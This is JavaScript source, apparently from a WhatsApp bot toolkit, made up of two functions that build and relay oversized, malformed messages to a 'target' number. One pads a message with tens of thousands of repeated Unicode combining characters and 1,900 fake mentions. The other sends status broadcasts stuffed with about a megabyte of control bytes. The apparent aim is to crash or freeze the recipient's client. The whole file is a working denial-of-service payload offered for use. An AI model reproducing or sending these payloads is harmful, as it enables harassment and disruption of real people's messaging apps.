async function BulldoIngpis(sock, target) {
  try {
    const m =
      "᬴᬴᬴".repeat(15000) +
      "꧔꧈".repeat(15000) +
      "ꦽ".repeat(20000);

    const massage = {
      viewOnceMessage: {
        message: {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: m,
                  hasMediaAttachment: false,
                  locationMessage: {
                    degreesLatitude: 992.999999,
                    degreesLongitude: -932.8889989,
                    name: m,
                    address: m,
                  },
                },
                body: {
                  text:
                    "༑ᐧ ✧ 𝙴𝚡𝚕𝚞𝚜𝚒𝚘𝚗 ✧ ༑" +
                    "꧔꧈".repeat(2000),
                },
                contextInfo: {
                  participant: target,
                  mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1900 }, () =>
                      "1" +
                      Math.floor(Math.random() * 5000000) +
                      "@s.whatsapp.net"
                    ),
                  ],
                  remoteJid: "X",
                  participant:
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net",
                  stanzaId: "123",
                  quotedMessage: {
                    paymentInviteMessage: {
                      serviceType: 3,
                      expiryTimestamp:
                        Date.now() + 1814400000,
                    },
                    forwardedAiBotMessageInfo: {
                      botName: "META AI",
                      botJid:
                        Math.floor(Math.random() * 5000000) +
                        "@s.whatsapp.net",
                      creatorName: "Bot",
                    },
                  },
                },
              },
            },
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(target, massage,{ userJid: target });
    await sock.relayMessage(target, msg.message, {
     participant: { jid: target },
     messageId: msg.key.id
     });
  console.log(chalk.red(`1MB SEDANG MELAYANG KE ${target}`));
  } catch (err) {
    console.error(err);
  }
}

async function BetaDelay(sock, target) {
    let biji = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: " - are you listening? ",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_message",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );
    
    let biji2 = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: " - who are you ? ",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );    

    await sock.relayMessage(
        "status@broadcast",
        biji.message,
        {
            messageId: biji.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );
    
    await sock.relayMessage(
        "status@broadcast",
        biji2.message,
        {
            messageId: biji2.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );    
}